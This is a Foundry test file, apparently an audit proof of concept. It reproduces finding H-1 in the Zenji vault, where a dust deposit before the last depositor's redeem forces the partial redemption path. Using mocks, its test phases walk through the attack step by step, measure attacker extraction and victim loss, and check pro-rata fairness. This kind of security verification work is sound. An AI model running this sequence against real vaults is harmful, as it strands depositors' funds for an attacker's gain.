// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

/// @notice PoC for H-1: Dust deposit forces last depositor into partial redemption path
/// Tests whether an attacker can deposit MIN_DEPOSIT dust before the last depositor's
/// redeem, causing isFinalWithdraw = false, and whether this causes material loss.
///
/// Bug location: Zenji.sol:872
///   bool isFinalWithdraw = (totalSupply() == shareAmount);
///   -- evaluated BEFORE _burn, so totalSupply includes the dust deposit
///
/// Attack vector:
///   1. Only one legitimate depositor remains (holds 99.9%+ of supply)
///   2. Attacker deposits MIN_DEPOSIT (1e4 satoshi = ~$10) right before victim's redeem
///   3. totalSupply() now = victimShares + dustShares != victimShares
///   4. isFinalWithdraw = false => partial path taken (not full unwind)
///   5. Victim receives proportional collateral instead of all remaining collateral

import { Test, console } from "forge-std/Test.sol";
import { Zenji } from "../src/Zenji.sol";
import { ZenjiViewHelper } from "../src/ZenjiViewHelper.sol";
import { IERC20 } from "../src/interfaces/IERC20.sol";
import { ILoanManager } from "../src/interfaces/ILoanManager.sol";
import { IYieldStrategy } from "../src/interfaces/IYieldStrategy.sol";
import { ISwapper } from "../src/interfaces/ISwapper.sol";
import { ERC4626 } from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20 as OZ_IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// ============ Minimal fork-free mocks (reuse patterns from ZenjiInvariant.t.sol) ============

contract H1MockWBTC is ERC20 {
    constructor() ERC20("Mock WBTC", "WBTC") { }

    function decimals() public pure override returns (uint8) {
        return 8;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract H1MockDebt is ERC20 {
    constructor() ERC20("Mock crvUSD", "crvUSD") { }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract H1MockYieldVault is ERC4626 {
    constructor(address asset_) ERC4626(OZ_IERC20(asset_)) ERC20("Mock Yield Vault", "mYV") { }
}

contract H1MockYieldStrategy is IYieldStrategy {
    ERC4626 public immutable yieldVault;
    IERC20 public immutable debtToken;
    address public override vault;
    address public initializer;
    uint256 private _costBasis;

    constructor(address _debt, address _yieldVault) {
        debtToken = IERC20(_debt);
        initializer = msg.sender;
        yieldVault = ERC4626(_yieldVault);
    }

    function initializeVault(address newVault) external {
        require(vault == address(0), "Initialized");
        require(newVault != address(0), "InvalidVault");
        require(msg.sender == initializer, "Unauthorized");
        vault = newVault;
        initializer = address(0);
    }

    modifier onlyVault() {
        require(msg.sender == vault, "Unauthorized");
        _;
    }

    function deposit(uint256 amount) external onlyVault returns (uint256) {
        debtToken.transferFrom(msg.sender, address(this), amount);
        debtToken.approve(address(yieldVault), amount);
        yieldVault.deposit(amount, address(this));
        _costBasis += amount;
        return amount;
    }

    function withdraw(uint256 amount) external onlyVault returns (uint256) {
        uint256 shares = yieldVault.convertToShares(amount);
        uint256 totalShares = yieldVault.balanceOf(address(this));
        if (shares > totalShares) shares = totalShares;
        uint256 received = yieldVault.redeem(shares, address(this), address(this));
        debtToken.transfer(vault, received);
        return received;
    }

    function withdrawAll() external onlyVault returns (uint256) {
        uint256 shares = yieldVault.balanceOf(address(this));
        if (shares == 0) return 0;
        _costBasis = 0;
        uint256 received = yieldVault.redeem(shares, address(this), address(this));
        debtToken.transfer(vault, received);
        return received;
    }

    function harvest() external pure returns (uint256) { return 0; }
    function emergencyWithdraw() external onlyVault returns (uint256) { return 0; }
    function asset() external view returns (address) { return address(debtToken); }
    function underlyingAsset() external view returns (address) { return address(debtToken); }

    function balanceOf() external view returns (uint256) {
        uint256 shares = yieldVault.balanceOf(address(this));
        return shares > 0 ? yieldVault.convertToAssets(shares) : 0;
    }

    function costBasis() external view returns (uint256) { return _costBasis; }
    function unrealizedProfit() external pure returns (uint256) { return 0; }
    function pendingRewards() external pure returns (uint256) { return 0; }
    function name() external pure returns (string memory) { return "H1 Mock Strategy"; }
}

/// @notice Mock loan manager: 1 WBTC (1e8 sats) = 90,000 debt tokens (90_000e18 wei)
contract H1MockLoanManager is ILoanManager {
    IERC20 public immutable _collateralAsset;
    IERC20 public immutable _debtAsset;
    address public vault;
    address public initializer;

    uint256 public positionCollateral;
    uint256 public positionDebt;
    uint256 public constant BTC_PRICE = 90_000;

    constructor(address collateral_, address debt_) {
        _collateralAsset = IERC20(collateral_);
        _debtAsset = IERC20(debt_);
        initializer = msg.sender;
    }

    function initializeVault(address _vault) external {
        require(vault == address(0), "Initialized");
        require(msg.sender == initializer, "Unauthorized");
        vault = _vault;
        initializer = address(0);
    }

    modifier onlyVault() {
        require(msg.sender == vault, "Unauthorized");
        _;
    }

    function createLoan(uint256 collateral, uint256 debt, uint256) external onlyVault {
        positionCollateral += collateral;
        H1MockDebt(address(_debtAsset)).mint(address(this), debt);
        positionDebt += debt;
    }

    function addCollateral(uint256 collateral) external onlyVault {
        positionCollateral += collateral;
    }

    function borrowMore(uint256 collateral, uint256 debt) external onlyVault {
        positionCollateral += collateral;
        H1MockDebt(address(_debtAsset)).mint(address(this), debt);
        positionDebt += debt;
    }

    function repayDebt(uint256 amount) external onlyVault {
        uint256 repay = amount > positionDebt ? positionDebt : amount;
        positionDebt -= repay;
    }

    function removeCollateral(uint256 amount) external onlyVault {
        uint256 remove = amount > positionCollateral ? positionCollateral : amount;
        positionCollateral -= remove;
        _collateralAsset.transfer(vault, remove);
    }

    function unwindPosition(uint256 collateralNeeded) external onlyVault {
        bool fullyClose =
            collateralNeeded == type(uint256).max || collateralNeeded >= positionCollateral;

        uint256 debtBal = _debtAsset.balanceOf(address(this));

        if (fullyClose) {
            uint256 actualRepayment = debtBal > positionDebt ? positionDebt : debtBal;
            if (actualRepayment > 0) {
                _debtAsset.transfer(address(0xdead), actualRepayment);
            }
            uint256 toReturn = positionCollateral;
            positionCollateral = 0;
            positionDebt = 0;
            if (toReturn > 0) {
                _collateralAsset.transfer(vault, toReturn);
            }
        } else if (positionCollateral > 0) {
            uint256 proportionalDebt = (positionDebt * collateralNeeded) / positionCollateral;
            uint256 actualRepayment = debtBal > proportionalDebt ? proportionalDebt : debtBal;
            if (actualRepayment > 0) {
                _debtAsset.transfer(address(0xdead), actualRepayment);
            }
            positionCollateral -= collateralNeeded;
            positionDebt -= actualRepayment;
            _collateralAsset.transfer(vault, collateralNeeded);
        }
    }

    function collateralAsset() external view returns (address) { return address(_collateralAsset); }
    function debtAsset() external view returns (address) { return address(_debtAsset); }

    function getCurrentLTV() external view returns (uint256) {
        if (positionCollateral == 0) return 0;
        uint256 collateralValue = _getCollateralValue(positionCollateral);
        if (collateralValue == 0) return 0;
        return (positionDebt * 1e18) / collateralValue;
    }

    function getCurrentCollateral() external view returns (uint256) { return positionCollateral; }
    function getCurrentDebt() external view returns (uint256) { return positionDebt; }

    function getHealth() external view returns (int256) {
        if (positionDebt == 0) return int256(10e18);
        uint256 collateralValue = _getCollateralValue(positionCollateral);
        return int256((collateralValue * 1e18) / positionDebt) - int256(1e18);
    }

    function loanExists() external view returns (bool) {
        return positionCollateral > 0 || positionDebt > 0;
    }

    function getCollateralValue(uint256 amount) external pure returns (uint256) {
        return _getCollateralValue(amount);
    }

    function getDebtValue(uint256 debtAmount) external pure returns (uint256) {
        return _getDebtValue(debtAmount);
    }

    function calculateBorrowAmount(uint256 collateral, uint256 targetLtv)
        external
        pure
        returns (uint256)
    {
        return (_getCollateralValue(collateral) * targetLtv) / 1e18;
    }

    function healthCalculator(int256, int256) external pure returns (int256) { return int256(5e18); }
    function minCollateral(uint256, uint256) external pure returns (uint256) { return 1e4; }

    function getPositionValues() external view returns (uint256, uint256) {
        return (positionCollateral, positionDebt);
    }

    function getNetCollateralValue() external view returns (uint256) {
        uint256 cv = _getCollateralValue(positionCollateral);
        uint256 dv = _getDebtValue(positionDebt);
        return cv > dv ? positionCollateral - dv : 0;
    }

    function checkOracleFreshness() external pure { }

    function transferCollateral(address to, uint256 amount) external onlyVault {
        uint256 bal = _collateralAsset.balanceOf(address(this));
        uint256 toSend = amount > bal ? bal : amount;
        if (toSend > 0) _collateralAsset.transfer(to, toSend);
    }

    function transferDebt(address to, uint256 amount) external onlyVault {
        uint256 bal = _debtAsset.balanceOf(address(this));
        uint256 toSend = amount > bal ? bal : amount;
        if (toSend > 0) _debtAsset.transfer(to, toSend);
    }

    function getCollateralBalance() external view returns (uint256) {
        uint256 totalBal = _collateralAsset.balanceOf(address(this));
        return totalBal > positionCollateral ? totalBal - positionCollateral : 0;
    }

    function getDebtBalance() external view returns (uint256) {
        return _debtAsset.balanceOf(address(this));
    }

    function _getCollateralValue(uint256 amount) internal pure returns (uint256) {
        return (amount * BTC_PRICE * 1e18) / 1e8;
    }

    function _getDebtValue(uint256 debtAmount) internal pure returns (uint256) {
        if (debtAmount == 0) return 0;
        uint256 denom = BTC_PRICE * 1e18;
        return (debtAmount * 1e8 + denom - 1) / denom;
    }
}

contract H1MockSwapper is ISwapper {
    IERC20 public immutable collateral;
    IERC20 public immutable debt;
    ILoanManager public loanManager;

    constructor(address _collateral, address _debt) {
        collateral = IERC20(_collateral);
        debt = IERC20(_debt);
    }

    function setLoanManager(address _lm) external { loanManager = ILoanManager(_lm); }

    function quoteCollateralForDebt(uint256 debtAmount) external view returns (uint256) {
        if (address(loanManager) == address(0)) return debtAmount;
        return loanManager.getDebtValue(debtAmount);
    }

    function swapCollateralForDebt(uint256 collateralAmount) external returns (uint256) {
        uint256 payout = address(loanManager) != address(0)
            ? loanManager.getCollateralValue(collateralAmount)
            : collateralAmount;
        debt.transfer(msg.sender, payout);
        return payout;
    }

    function swapDebtForCollateral(uint256 debtAmount) external returns (uint256) {
        uint256 payout = address(loanManager) != address(0)
            ? loanManager.getDebtValue(debtAmount)
            : debtAmount;
        collateral.transfer(msg.sender, payout);
        return payout;
    }
}

// ============ Test Contract ============

contract VerifyH1Test is Test {
    address owner = makeAddr("owner");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    Zenji vault;
    ZenjiViewHelper viewHelper;
    H1MockWBTC wbtc;
    H1MockDebt crvUSD;
    H1MockLoanManager loanManager;
    H1MockYieldStrategy strategy;
    H1MockSwapper swapper;

    uint256 constant MIN_DEPOSIT = 1e4; // 1e4 satoshi = Zenji's MIN_DEPOSIT constant

    function setUp() public {
        wbtc = new H1MockWBTC();
        crvUSD = new H1MockDebt();

        viewHelper = new ZenjiViewHelper();

        swapper = new H1MockSwapper(address(wbtc), address(crvUSD));
        wbtc.mint(address(swapper), 1e20);
        crvUSD.mint(address(swapper), 1e38);

        H1MockYieldVault yieldVault = new H1MockYieldVault(address(crvUSD));
        strategy = new H1MockYieldStrategy(address(crvUSD), address(yieldVault));
        loanManager = new H1MockLoanManager(address(wbtc), address(crvUSD));

        swapper.setLoanManager(address(loanManager));

        vault = new Zenji(
            address(wbtc),
            address(crvUSD),
            address(loanManager),
            address(strategy),
            address(swapper),
            owner,
            address(viewHelper)
        );

        strategy.initializeVault(address(vault));
        loanManager.initializeVault(address(vault));

        // Fund victim and attacker
        wbtc.mint(victim, 1e9); // 10 WBTC
        wbtc.mint(attacker, MIN_DEPOSIT); // just enough for dust deposit

        vm.prank(victim);
        wbtc.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        wbtc.approve(address(vault), type(uint256).max);
    }

    /// @notice PHASE 1: Confirm isFinalWithdraw check is pre-burn
    /// This test proves the check at Zenji.sol:872 uses totalSupply() before burning.
    function test_H1_preBurnCheckConfirmed() public {
        // Victim deposits 1 WBTC
        vm.prank(victim);
        uint256 victimShares = vault.deposit(1e8, victim);

        // Advance 1 block to clear cooldown
        vm.roll(block.number + 2);

        // State before attacker deposit
        uint256 supplyBefore = vault.totalSupply();
        assertEq(supplyBefore, victimShares, "Supply should equal victim shares");

        // Attacker deposits dust (MIN_DEPOSIT = 1e4 satoshi)
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(MIN_DEPOSIT, attacker);
        assertGt(attackerShares, 0, "Attacker should receive shares");

        uint256 supplyAfter = vault.totalSupply();
        assertEq(supplyAfter, victimShares + attackerShares, "Supply should include dust shares");

        // KEY ASSERTION: the check at L872 `totalSupply() == shareAmount`
        // For victim redeeming their exact shares:
        //   totalSupply() = victimShares + attackerShares
        //   shareAmount = victimShares
        //   => check is FALSE => isFinalWithdraw = false
        bool isFinalWithdrawWouldBe = (supplyAfter == victimShares);
        assertFalse(
            isFinalWithdrawWouldBe,
            "CONFIRMED: dust deposit prevents isFinalWithdraw - attack precondition confirmed"
        );

        console.log("totalSupply() before victim redeem:", supplyAfter);
        console.log("victimShares to redeem:", victimShares);
        console.log("attackerShares (dust):", attackerShares);
        console.log("isFinalWithdraw would be:", isFinalWithdrawWouldBe);
    }

    /// @notice PHASE 2: Measure actual collateral received via partial path vs expected
    /// Tests whether the partial redemption path causes material loss to the victim.
    function test_H1_partialPathVsFullPathComparison() public {
        uint256 depositAmount = 1e8; // 1 WBTC

        // === Scenario A: No attacker dust - victim gets full unwind path ===
        // Use a fresh vault to avoid block state issues
        {
            H1MockWBTC wbtcA = new H1MockWBTC();
            H1MockDebt debtA = new H1MockDebt();
            H1MockYieldVault yieldVaultA = new H1MockYieldVault(address(debtA));
            H1MockYieldStrategy stratA =
                new H1MockYieldStrategy(address(debtA), address(yieldVaultA));
            H1MockLoanManager lmA = new H1MockLoanManager(address(wbtcA), address(debtA));
            H1MockSwapper swapA = new H1MockSwapper(address(wbtcA), address(debtA));
            wbtcA.mint(address(swapA), 1e20);
            debtA.mint(address(swapA), 1e38);
            swapA.setLoanManager(address(lmA));
            ZenjiViewHelper vh = new ZenjiViewHelper();

            Zenji vaultA = new Zenji(
                address(wbtcA),
                address(debtA),
                address(lmA),
                address(stratA),
                address(swapA),
                owner,
                address(vh)
            );
            stratA.initializeVault(address(vaultA));
            lmA.initializeVault(address(vaultA));

            address victimA = makeAddr("victimA");
            wbtcA.mint(victimA, 1e9);
            vm.prank(victimA);
            wbtcA.approve(address(vaultA), type(uint256).max);

            vm.prank(victimA);
            uint256 sharesA = vaultA.deposit(depositAmount, victimA);

            vm.roll(block.number + 2);

            vm.prank(victimA);
            uint256 collateralReceivedFull = vaultA.redeem(sharesA, victimA, victimA);

            console.log("Scenario A (no dust): collateral received =", collateralReceivedFull);
            console.log("  totalSupply after =", vaultA.totalSupply());

            // === Scenario B: Attacker deposits dust BEFORE victim redeems ===
            // Use MAIN vault here - fresh address (victim2) to avoid block state issues
            address victim2 = makeAddr("victim2");
            wbtc.mint(victim2, 1e9);
            vm.prank(victim2);
            wbtc.approve(address(vault), type(uint256).max);

            vm.prank(victim2);
            uint256 sharesB = vault.deposit(depositAmount, victim2);

            vm.roll(block.number + 5);

            // Attacker deposits dust  (minimum allowed: 1e4 satoshi)
            vm.prank(attacker);
            vault.deposit(MIN_DEPOSIT, attacker);

            // Advance more blocks to clear cooldown
            vm.roll(block.number + 5);
            
            vm.prank(victim2);
            uint256 collateralReceivedPartial = vault.redeem(sharesB, victim2, victim2);

            console.log("Scenario B (with dust): collateral received =", collateralReceivedPartial);
            console.log("  totalSupply after =", vault.totalSupply());
            console.log("  attacker shares remaining =", vault.balanceOf(attacker));

            // === Compare outcomes ===
            console.log("Full path collateral:", collateralReceivedFull);
            console.log("Partial path collateral:", collateralReceivedPartial);

            if (collateralReceivedFull > collateralReceivedPartial) {
                uint256 loss = collateralReceivedFull - collateralReceivedPartial;
                uint256 lossBps = (loss * 10_000) / collateralReceivedFull;
                console.log("Loss to victim:", loss, "satoshi");
                console.log("Loss in BPS:", lossBps);
                console.log("CONFIRMED: partial path causes loss vs full path");
            } else if (collateralReceivedFull == collateralReceivedPartial) {
                console.log("NO LOSS: both paths return identical collateral");
            } else {
                console.log("ANOMALY: partial path returned MORE than full path");
            }
        }
    }

    /// @notice PHASE 3: Test that attacker profits from residual value stranding
    /// After victim exits via partial path, what does attacker extract via their final redeem?
    function test_H1_attackerExtractionAfterVictimExit() public {
        uint256 depositAmount = 1e8; // 1 WBTC

        // Victim deposits
        vm.prank(victim);
        uint256 victimShares = vault.deposit(depositAmount, victim);

        vm.roll(block.number + 2);

        // Attacker deposits dust
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(MIN_DEPOSIT, attacker);

        // Advance 1 block for attacker cooldown
        vm.roll(block.number + 2);

        // Record total collateral before victim exits
        uint256 totalCollateralBefore = vault.totalAssets();

        // Victim exits via partial path
        // Advance blocks to clear cooldown
        vm.roll(block.number + 5);
        vm.prank(victim);
        uint256 victimOut = vault.redeem(victimShares, victim, victim);

        console.log("--- After victim exits ---");
        console.log("Victim received:", victimOut);
        console.log("Vault totalSupply after victim exit:", vault.totalSupply());
        console.log("Vault totalAssets after victim exit:", vault.totalAssets());
        console.log("Attacker shares:", vault.balanceOf(attacker));

        // Attacker's expected fair value (pro-rata at time of victim exit):
        // attackerShares * totalCollateralBefore / (victimShares + attackerShares)
        uint256 attackerFairValue =
            (attackerShares * totalCollateralBefore) / (victimShares + attackerShares);
        console.log("Attacker's fair pro-rata value:", attackerFairValue);

        // Now attacker redeems as sole remaining holder => isFinalWithdraw = true
        // Advance blocks again to clear cooldown for attacker
        vm.roll(block.number + 5);
        vm.prank(attacker);
        uint256 attackerOut = vault.redeem(attackerShares, attacker, attacker);

        console.log("Attacker received:", attackerOut);
        console.log("Attacker's deposit cost:", MIN_DEPOSIT);

        if (attackerOut > attackerFairValue) {
            uint256 profit = attackerOut - attackerFairValue;
            console.log("ATTACKER PROFIT (residual capture):", profit, "satoshi");
        } else {
            console.log("No attacker profit from residual capture");
        }

        // Verify vault is fully drained
        assertEq(vault.totalSupply(), 0, "Vault should have zero supply after both exit");
        assertEq(vault.totalAssets(), 0, "Vault should have zero assets after both exit");
    }

    /// @notice PHASE 4: Quantify loss at scale - $1M vault
    /// Victim holds 99.9% of a $1M vault; attacker deposits dust
    function test_H1_lossAtScale() public {
        // Large victim deposit: 10 WBTC at $90k = $900k
        uint256 largeDeposit = 10e8; // 10 WBTC
        wbtc.mint(victim, largeDeposit); // extra for scale test

        vm.prank(victim);
        wbtc.approve(address(vault), type(uint256).max);

        vm.prank(victim);
        uint256 victimShares = vault.deposit(largeDeposit, victim);

        vm.roll(block.number + 2);

        // Attacker deposits minimum dust
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(MIN_DEPOSIT, attacker);

        uint256 totalSupplyWithDust = vault.totalSupply();
        uint256 totalAssets = vault.totalAssets();

        // The value stranded for the attacker = attacker's pro-rata share of totalAssets
        uint256 dustShareValue = (attackerShares * totalAssets) / totalSupplyWithDust;

        console.log("--- $1M scale test ---");
        console.log("Total assets in vault (satoshi):", totalAssets);
        console.log("Victim shares:", victimShares);
        console.log("Attacker dust shares:", attackerShares);
        console.log("totalSupply with dust:", totalSupplyWithDust);
        console.log("Dust deposit cost (satoshi):", MIN_DEPOSIT);
        console.log("Value represented by dust shares (satoshi):", dustShareValue);
        console.log(
            "Victim loss (stays in position for attacker):", dustShareValue
        );
        console.log(
            "Loss as BPS of victim deposit:",
            (dustShareValue * 10_000) / totalAssets
        );

        // Assert the attack is possible (pre-conditions met)
        assertGt(attackerShares, 0, "Attacker received shares");
        assertFalse(
            totalSupplyWithDust == victimShares,
            "isFinalWithdraw would be false - attack precondition confirmed"
        );
    }

    /// @notice PHASE 5: Defender test - does the partial path give victim fair pro-rata value?
    /// Key question: does the victim get their correct proportional share, or is there
    /// additional loss from the partial unwind path beyond the pro-rata reduction?
    function test_H1_partialPathFairness() public {
        uint256 depositAmount = 1e8; // 1 WBTC

        vm.prank(victim);
        uint256 victimShares = vault.deposit(depositAmount, victim);

        vm.roll(block.number + 2);

        // Attacker deposits dust
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(MIN_DEPOSIT, attacker);

        vm.roll(block.number + 2);

        // Compute expected pro-rata collateral for victim using vault's own formula
        uint256 totalAssets = vault.totalAssets();
        uint256 totalSupply = vault.totalSupply();
        uint256 vso = vault.VIRTUAL_SHARE_OFFSET();

        uint256 expectedProRata = (victimShares * (totalAssets + vso)) / (totalSupply + vso);

        console.log("Total assets:", totalAssets);
        console.log("Total supply:", totalSupply);
        console.log("Victim shares:", victimShares);
        console.log("Attacker shares:", attackerShares);
        console.log("Expected pro-rata (convertToAssets):", expectedProRata);

        // Execute victim redeem
        vm.prank(victim);
        uint256 victimOut = vault.redeem(victimShares, victim, victim);

        console.log("Actual received:", victimOut);
        console.log("Expected:", expectedProRata);

        // The partial path uses _calculateCollateralForShares which applies the same formula.
        // So the victim SHOULD get their correct pro-rata value.
        // Any difference here reveals a bug in the partial path itself.
        assertApproxEqAbs(
            victimOut,
            expectedProRata,
            10, // allow 10 satoshi rounding tolerance
            "Partial path should return fair pro-rata value"
        );

        console.log("Defender conclusion: partial path gives fair pro-rata value");
        console.log("Victim loss = attacker's pro-rata share (victim loses what attacker gains)");
    }
}
